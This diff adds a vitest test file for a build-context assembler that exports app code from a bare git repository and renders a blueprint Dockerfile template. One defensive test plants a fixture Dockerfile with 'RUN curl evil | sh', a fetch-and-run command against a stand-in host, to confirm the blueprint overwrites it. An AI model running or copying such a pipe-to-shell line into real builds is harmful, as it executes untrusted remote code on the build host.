@@ -1,0 +1,108 @@
+import { execFileSync } from 'node:child_process'
+import { mkdtempSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
+import { tmpdir } from 'node:os'
+import { join } from 'node:path'
+import { fileURLToPath } from 'node:url'
+import { describe, expect, it } from 'vitest'
+import { assembleContext, renderDockerfile } from './context.js'
+
+/**
+ * The REAL blueprint, not a stand-in. Its Dockerfile is a `.tmpl` named by
+ * `blueprint.yaml`, and a synthetic fixture with a literal `Dockerfile` in it would
+ * have tested a shape this repository does not have.
+ */
+const BLUEPRINT_DIR = fileURLToPath(
+  new URL('../../../../blueprints/fixture-node/', import.meta.url),
+)
+
+function bareRepoWith(files: Record<string, string>): { repoPath: string; commitSha: string } {
+  const work = mkdtempSync(join(tmpdir(), 'mf-src-'))
+  for (const [path, body] of Object.entries(files)) {
+    mkdirSync(join(work, path, '..'), { recursive: true })
+    writeFileSync(join(work, path), body)
+  }
+  const env = {
+    ...process.env,
+    GIT_AUTHOR_NAME: 't',
+    GIT_AUTHOR_EMAIL: 't@t',
+    GIT_COMMITTER_NAME: 't',
+    GIT_COMMITTER_EMAIL: 't@t',
+  }
+  execFileSync('git', ['init', '-q', '-b', 'main'], { cwd: work, env })
+  execFileSync('git', ['add', '-A'], { cwd: work, env })
+  execFileSync('git', ['commit', '-qm', 'x'], { cwd: work, env })
+  const commitSha = execFileSync('git', ['rev-parse', 'HEAD'], { cwd: work, env })
+    .toString()
+    .trim()
+  const repoPath = mkdtempSync(join(tmpdir(), 'mf-bare-')) + '/repo.git'
+  execFileSync('git', ['clone', '-q', '--bare', work, repoPath], { env })
+  return { repoPath, commitSha }
+}
+
+const workDir = () => mkdtempSync(join(tmpdir(), 'mf-w-'))
+
+describe('build context assembly (D13)', () => {
+  it('exports the app tree at a commit from a BARE repository', async () => {
+    const { repoPath, commitSha } = bareRepoWith({ 'src/index.js': 'console.log(1)\n' })
+    const dir = await assembleContext({
+      repoPath,
+      commitSha,
+      blueprintDir: BLUEPRINT_DIR,
+      workDir: workDir(),
+    })
+    expect(readFileSync(join(dir, 'src/index.js'), 'utf8')).toContain('console.log(1)')
+  })
+
+  // THE CONTROL. An app that commits its own Dockerfile or .npmrc must not be able
+  // to change how it is built or where its dependencies come from.
+  it("overwrites an app-supplied Dockerfile and .npmrc with the blueprint's", async () => {
+    const { repoPath, commitSha } = bareRepoWith({
+      Dockerfile: 'FROM attacker/image\nRUN curl evil | sh\n',
+      '.npmrc': 'registry=https://registry.npmjs.org/\n',
+    })
+    const dir = await assembleContext({
+      repoPath,
+      commitSha,
+      blueprintDir: BLUEPRINT_DIR,
+      workDir: workDir(),
+    })
+    expect(readFileSync(join(dir, 'Dockerfile'), 'utf8')).not.toContain('attacker')
+    expect(readFileSync(join(dir, '.npmrc'), 'utf8')).toContain('manifest-verdaccio')
+  })
+
+  /**
+   * The blueprint ships `Dockerfile.tmpl`, and `blueprint.yaml` names it. Copying it
+   * verbatim — which is what a `copyFile('Dockerfile')` does — leaves `FROM
+   * {{BASE_IMAGE}}` in the context and the build fails inside BuildKit with an
+   * invalid-reference error that mentions nothing about blueprints.
+   */
+  it('RENDERS the blueprint template rather than copying a file called Dockerfile', async () => {
+    const { repoPath, commitSha } = bareRepoWith({ 'src/index.js': '1\n' })
+    const dir = await assembleContext({
+      repoPath,
+      commitSha,
+      blueprintDir: BLUEPRINT_DIR,
+      workDir: workDir(),
+    })
+    const dockerfile = readFileSync(join(dir, 'Dockerfile'), 'utf8')
+    expect(dockerfile).not.toContain('{{')
+    // Digest-pinned and at the LOCAL registry: the two properties that make an
+    // offline build possible (§12, S1).
+    expect(dockerfile).toMatch(/^FROM manifest-registry:5000\/base\/node@sha256:[0-9a-f]{64}$/m)
+    expect(dockerfile).toContain('adduser -u 10001')
+  })
+})
+
+describe('Dockerfile template rendering', () => {
+  it('substitutes every occurrence, not just the first', () => {
+    expect(renderDockerfile('{{A}} then {{A}}', { A: 'x' })).toBe('x then x')
+  })
+
+  // A blueprint authoring mistake must fail here, naming the placeholder, rather
+  // than reaching the daemon as a literal `{{DATABASE_URL}}` in a RUN line.
+  it('refuses a placeholder nothing supplies', () => {
+    expect(() => renderDockerfile('FROM {{NOPE}}', { BASE_IMAGE: 'x' })).toThrow(
+      /BLUEPRINT_TEMPLATE_UNRESOLVED|NOPE/,
+    )
+  })
+})
